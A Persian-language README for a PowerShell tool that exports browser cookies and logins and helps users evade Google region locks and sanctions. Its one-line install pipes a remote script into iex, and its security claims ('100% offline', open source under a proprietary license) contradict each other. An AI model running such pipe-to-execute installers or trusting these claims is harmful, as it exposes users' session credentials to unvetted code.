# Antigravity Cleaner Shell (v4.1.0)

<div align="center">
  <img src="docs/images/banner.png" alt="Antigravity Cleaner Banner" width="100%">
  <br>

  [![Version](https://img.shields.io/badge/Version-4.1.0-blue?style=for-the-badge)](https://github.com/LCW0NJUPT/antigravity-cleaner-macos/releases)
  [![License](https://img.shields.io/badge/License-TACL-red.svg?style=for-the-badge)](docs/LICENSE.md)
  [![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-blue.svg?style=for-the-badge&logo=platform.sh)](https://github.com/LCW0NJUPT/antigravity-cleaner-macos)
  [![Language](https://img.shields.io/badge/Language-PowerShell-yellow.svg?style=for-the-badge&logo=powershell)]()
  [![Security](https://img.shields.io/badge/Security-Zero%20Telemetry-green.svg?style=for-the-badge&logo=shields)](docs/SECURITY.md)
</div>

> **تقدیم به مردم ایران و تمامی کسانی که در اسارت تحریم‌های دیجیتال و محدودیت‌های اینترنتی گرفتار شده‌اند.**
> ما باور داریم دسترسی آزاد به دانش، تکنولوژی و ابزارهای توسعه، حق مسلم هر انسانی است. این ابزار صدای آزادی دیجیتال است؛ برای عبور از دیوارهایی که هم از داخل و هم از خارج دور ما کشیده شده‌اند.

---

## فهرست مطالب
1. [این ابزار برای چه کسانی است؟](#این-ابزار-برای-چه-کسانی-است)
2. [درباره پروژه](#درباره-پروژه)
3. [نصب آسان (One-Line)](#نصب-آسان-one-line)
4. [ویژگی‌های کلیدی](#ویژگی‌های-کلیدی)
5. [امنیت و حریم خصوصی](#امنیت-و-حریم-خصوصی)
6. [راهنمای کامل ماژول‌ها](#راهنمای-کامل-ماژول‌ها)
7. [برنامه آپدیت‌ها (Roadmap)](#برنامه-آپدیت‌ها-roadmap)
8. [لایسنس](#لایسنس)
9. [درباره نویسنده](#درباره-نویسنده)

---

## 🎯 این ابزار برای چه کسانی است؟

این ابزار به طور اختصاصی برای افراد زیر طراحی شده است:

### 🌍 **توسعه‌دهندگان در کشورهای تحت تحریم**
اگر در **ایران، چین، روسیه، کوبا، سوریه، کره شمالی، ترکمنستان یا ترکیه** هستید، احتمالاً با این ارورها مواجه شده‌اید:
*   `HTTP Error 403: Forbidden` هنگام دسترسی به سرویس‌های گوگل
*   `ModuleNotFoundError` هنگام نصب Antigravity IDE
*   ارورهای Region Lock که مانع دسترسی به Gemini AI، Colab یا Cloud Platform می‌شوند
*   دیوار آتش بزرگ (Great Firewall) یا سانسور دولتی که ابزارهای توسعه را مسدود می‌کند

### 💻 **برنامه‌نویسانی که با ارور نصب مواجه می‌شوند**
ارورهای رایجی که این ابزار حل می‌کند:
*   `ERROR: Antigravity installation failed`
*   `Pip install error: Could not find a version that satisfies the requirement`
*   `Dependency conflict detected`
*   خرابی سشن مرورگر بعد از نصب مجدد ویندوز

### 🔧 **هر کسی که به سرویس‌های گوگل نیاز دارد**
*   توسعه‌دهندگانی که به Gemini AI، Google Colab یا Cloud Platform نیاز دارند
*   کاربرانی که با اختلال DNS/شبکه مواجه هستند
*   کسانی که می‌خواهند سشن مرورگر خود را در تغییرات سیستم حفظ کنند

**اگر تا به حال گوگل کرده‌اید "چطور ارور نصب antigravity را حل کنم" یا "دور زدن region lock" — این ابزار برای شماست.**

---

## درباره پروژه
**Antigravity Cleaner Shell** یک ابزار متن‌باز (Open Source) و قدرتمند مبتنی بر PowerShell است که با هدف کمک به توسعه‌دهندگان، فریلنسرها و کاربران حرفه‌ای طراحی شده است. هدف اصلی این ابزار، مدیریت هوشمند سشن‌های مرورگر، دور زدن محدودیت‌های تحریم گوگل (Google Sanctions) و بهینه‌سازی سیستم برای کارهای توسعه نرم‌افزار است.

این نسخه (**v4.1.0**) به طور کامل بازنویسی شده تا به صورت مالتی‌پلتفرم (Multi-Platform) روی **ویندوز، مک و لینوکس** اجرا شود.

---

## نصب آسان (One-Line)

برای نصب و اجرا، پاورشل را باز کنید و فقط خط زیر را کپی کنید و اینتر بزنید.
(این دستور به طور خودکار برنامه را دانلود کرده و یک آیکون روی دسکتاپ شما می‌سازد)

```powershell
iwr https://raw.githubusercontent.com/LCW0NJUPT/antigravity-cleaner-macos/main/install.ps1 -useb | iex
```

*اگر با خطا مواجه شدید، ترمینال را به صورت Administrator اجرا کنید.*

<div align="center">
  <img src="docs/images/screen_collage.png" alt="Antigravity Shell Interface Collage" width="80%">
  <p><i>نمای کلی ماژول‌ها و محیط کاربری</i></p>
</div>

---

## ویژگی‌های کلیدی

### 1. مدیریت پیشرفته سشن‌ها (Session Manager)
این ماژول قلب تپنده آنتی‌گرویتی است که به شما امکان می‌دهد پروفایل‌های مرورگر خود را مدیریت و جابجا کنید.
*   **تشخیص هوشمند:** شناسایی خودکار تمام پروفایل‌های مرورگرهای Chrome, Edge, Brave, Opera به همراه نمایش ایمیل متصل به آن‌ها.
*   **بکاپ دوگانه (Dual Mode Backup):**
    *   **حالت Light:** بکاپ‌گیری فقط از کوکی‌ها، لاگین‌ها و تنظیمات ضروری (~۲۰ مگابایت). ایده‌آل برای انتقال سریع وش لاگین ماندن بدون نیاز به وارد کردن مجدد رمز عبور.
    *   **حالت Full:** بکاپ کامل از تمام دیتای پروفایل شامل اکستنشن‌ها، کش و هیستوری (~۵۰۰+ مگابایت).
*   **پشتیبانی از Antigravity Desktop:** بکاپ اختصاصی، امن و خودکار (همراه با بستن پروسه) از نسخه دسکتاپ برنامه Antigravity (مبتنی بر VS Code).

### 2. بازرس ریجن (Region Inspector)
ابزاری حیاتی برای کسانی که نگران تحریم شدن اکانت گوگل خود هستند.
*   **بررسی وضعیت:** هدایت مستقیم به صفحه مخفی `Country Association` گوگل با پروفایل صحیح.
*   **چک‌لیست ضد نشت (Pre-Check):** ابزار داخلی هوشمند برای تست IP Leak، DNS Leak و WebRTC قبل از اقدام به تغییر ریجن. این قابلیت شانس پذیرش درخواست تغییر کشور شما را تا ۱۰ برابر افزایش می‌دهد.

### 3. آنالیزور شبکه (Systems Analysis)
*   **تست اتصال:** بررسی لحظه‌ای وضعیت اتصال به سرورهای کلیدی گوگل (Google Developer Services, Gemini AI, Cloud Platform) و نمایش پینگ و وضعیت HTTP.
*   **تست وابستگی‌ها:** بررسی دسترسی به مخازن حیاتی برنامه‌نویسان (GitHub API, VS Code Marketplace).

### 4. بهینه‌سازی سیستم (System Cleaner)
*   حذف فایل‌های موقت (Temp) و کش‌های سیستمی که ممکن است حاوی ردپای لوکیشن قبلی شما باشند.
*   پاکسازی کش‌های حجیم ابزارهای برنامه‌نویسی (JetBrains, VSCode) برای آزادسازی فضای دیسک و بهبود سرعت IDEها.

### 5. ابزار تعمیر شبکه (Network Reset)
*   رفع مشکلات اتصال با فلاش کردن DNS، ریست کردن Winsock و تنظیمات TCP/IP تنها با یک کلیک. (نیاز به دسترسی ادمین).

---

## امنیت و حریم خصوصی
ما امنیت شما را جدی می‌گیریم.
*   **۱۰۰٪ آفلاین:** این اسکریپت هیچ‌گونه دسترسی به شبکه برای "ارسال داده" ندارد. می‌توانید کد را باز کرده و توابع `Invoke-WebRequest` را بررسی کنید؛ آنها فقط برای تست اتصال (Ping) استفاده می‌شوند.
*   **بدون تله‌متری:** ما هیچ علاقه‌ای به جمع‌آوری داده‌های شما نداریم.
*   **رمزنگاری:** فایل‌های بکاپ سشن، حاوی اطلاعات حساس هستند که با استاندارد Windows DPAPI رمزنگاری شده‌اند و فقط روی سیستم شما قابل استفاده‌اند (مگر با بکاپ Full Profile).

---

## راهنمای کامل ماژول‌ها

### بکاپ‌گیری از پروفایل
1. در منوی اصلی گزینه `2` (Session Manager) را انتخاب کنید.
2. گزینه `1` (Backup Browser Profile) را بزنید.
3. پروفایل مورد نظر را از لیست (که ایمیل‌ها را نشان می‌دهد) انتخاب کنید.
4. **حالت Light** را برای بکاپ سریع (فقط لاگین) یا **حالت Full** را برای جابجایی کامل انتخاب کنید.

### ریستور کردن
1. در Session Manager گزینه `3` را بزنید.
2. لیست بکاپ‌ها را می‌بینید (با تاریخ و نوع Light/Full).
3. با انتخاب بکاپ، برنامه به طور خودکار مرورگر را می‌بندد و فایل‌ها را جایگزین می‌کند. **هشدار:** دیتای قبلی آن پروفایل پاک می‌شود.

### تغییر ریجن گوگل
1. در منوی اصلی گزینه `5` (Region Inspector) را بزنید.
2. ابتدا پیشنهاد می‌شود `Pre-Check` را انجام دهید تا مطمئن شوید VPN شما سالم است.
3. پروفایل را انتخاب کنید تا مرورگر باز شود و کشور ثبت شده را ببینید.

---

## برنامه آپدیت‌ها (Roadmap)
ما مرتباً ویژگی‌های جدید اضافه می‌کنیم. در آینده خواهیم داشت:
- [x] **v4.1:** پشتیبانی کامل از لینوکس و مک (Cross-Platform).
- [ ] **v4.2:** اضافه کردن پشتیبانی از فایرفاکس (Firefox).
- [ ] **v4.3:** ابزار تغییر DNS خودکار (شکن، 403، کلادفلر).
- [ ] **v4.5:** رابط کاربری گرافیکی (GUI) مدرن.

---

## 📖 مستندات و راهنما
برای مشاهده آموزش قدم‌به‌قدم و تصویری تمام ماژول‌ها، به راهنمای ویکی-استایل ما مراجعه کنید:

👉 **[مطالعه: راهنمای جامع استفاده](docs/GUIDE.fa.md)**
👉 **[امنیت: سیاست حفاظت از داده](docs/SECURITY.md)**

---

## 📈 رشد پروژه (Star History)
اگر این ابزار برایتان مفید بود، با دادن ستاره (Star) به ما انرژی بدهید!
<br>
<a href="https://star-history.com/#LCW0NJUPT/antigravity-cleaner-macos&Date">
 <picture>
   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=LCW0NJUPT/antigravity-cleaner-macos&type=Date&theme=dark" />
   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=LCW0NJUPT/antigravity-cleaner-macos&type=Date" />
   <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=LCW0NJUPT/antigravity-cleaner-macos&type=Date" />
 </picture>
</a>

---

## 💖 کمپین حمایت از آزادی دیجیتال
**ما در یک مسابقه علیه زمان هستیم.**
تحریم‌ها و فیلترینگ هر روز پیچیده‌تر می‌شوند. آنتی‌گرویتی نسخه v4.1.0 اکنون **مولتی‌پلتفرم** است، اما نگهداری آن برای ویندوز، مک و لینوکس نیاز به تلاش مستمر دارد.

**حمایت شما، سوخت این موتور است.**
اگر این ابزار ساعت‌ها وقت شما را نجات داده یا مشکل تحریم گوگل‌تان را حل کرده، لطفاً دونیت را در نظر بگیرید. این به ما کمک می‌کند بیدار بمانیم، سریع‌تر کد بزنیم و برای اینترنت آزاد بجنگیم.

<div align="center">

| **روش پرداخت** | **لینک / آدرس** |
| :--- | :--- |
| **NOWPayments** | [👉 **کلیک برای دونیت (تتر/بیتکوین و...)**](https://nowpayments.io/donation/tawroot) |
| **USDT (TRC20)** | `TN8GzU2X3x... (انتخاب در لینک بالا)` |
| **Bitcoin** | `bc1q... (انتخاب در لینک بالا)` |

</div>

> *"توسعه مستقل، تنها راه تضمین آزادی ابزارهاست."*

---

## 🤝 مشارکت در پروژه
ما از پیشنهادات و گزارش باگ‌ها استقبال می‌کنیم!

**نحوه مشارکت:**
1.  **پیشنهاد قابلیت جدید:** در بخش [Discussions](https://github.com/LCW0NJUPT/antigravity-cleaner-macos/discussions) گیت‌هاب مطرح کنید.
2.  **گزارش باگ:** در بخش [Issues](https://github.com/LCW0NJUPT/antigravity-cleaner-macos/issues) با جزئیات کامل ثبت کنید.
3.  **کد:** به دلیل ماهیت اختصاصی لایسنس، متأسفانه Pull Request پذیرفته نمی‌شود، اما نظرات و ایده‌های شما بسیار ارزشمند است!

---

## 📞 تماس و انجمن
*   **کانال تلگرام:** [t.me/panbehnet](https://t.me/panbehnet) - اخبار، نکات و پشتیبانی.
*   **GitHub Issues:** [گزارش مشکلات](https://github.com/LCW0NJUPT/antigravity-cleaner-macos/issues).
*   **GitHub Discussions:** [گفتگو با جامعه](https://github.com/LCW0NJUPT/antigravity-cleaner-macos/discussions).

---

## درباره نویسنده
توسعه داده شده توسط **Tawana Network**.
*جایی که دیگران دیوار می‌کشند، ما پل می‌سازیم.*

<!--
#antigravity #vpn #censorship #iran #python #powershell #google-region-bypass #session-manager #devops #network-optimization #sanctions #internet-freedom #developer-tools
-->
